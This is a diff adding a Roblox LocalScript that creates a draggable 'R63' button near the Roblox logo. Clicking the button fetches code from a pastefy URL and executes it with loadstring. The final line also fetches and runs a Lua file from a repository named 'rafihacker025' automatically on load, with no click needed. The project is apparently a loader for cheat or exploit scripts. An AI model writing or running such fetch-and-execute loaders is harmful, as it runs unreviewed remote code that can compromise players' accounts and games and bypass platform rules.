@@ -1,0 +1,79 @@
+
+-- LocalScript (Put in StarterPlayer > StarterPlayerScripts)
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TopLeftButtonGui"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 999999          -- Makes it go to the absolute front
+screenGui.Parent = playerGui
+
+local button = Instance.new("TextButton")
+button.Name = "texthere"
+button.Size = UDim2.new(0, 60, 0, 44)
+button.Position = UDim2.new(0, 33.5, 0, -46)     -- Right next to Roblox logo
+button.AnchorPoint = Vector2.new(0, 0)
+button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)   -- Black
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Text = " R \n 6 \n 3 "
+button.Font = Enum.Font.Code                         -- Console / monospace font
+button.TextSize = 14
+button.BorderSizePixel = 0
+button.ZIndex = 1000000                              -- Extra high ZIndex
+button.Parent = screenGui
+
+-- Grey border
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(120, 120, 120)
+stroke.Thickness = 1.5
+stroke.Parent = button
+
+-- Slight rounding
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 5)
+corner.Parent = button
+
+-- Draggable
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	button.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
+end
+
+button.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = button.Position
+		
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+button.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+
+-- Click to load script and remove button
+button.MouseButton1Click:Connect(function()
+	-- ================== PUT YOUR LOADSTRING HERE ==================
+	loadstring(game:HttpGet('https://pastefy.app/KpjGoIwi/raw'))()
+	-- ============================================================
+	
+	button:Destroy()
+end)
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/rafihacker025/rblx-scripts/refs/heads/main/wtf5.lua"))()
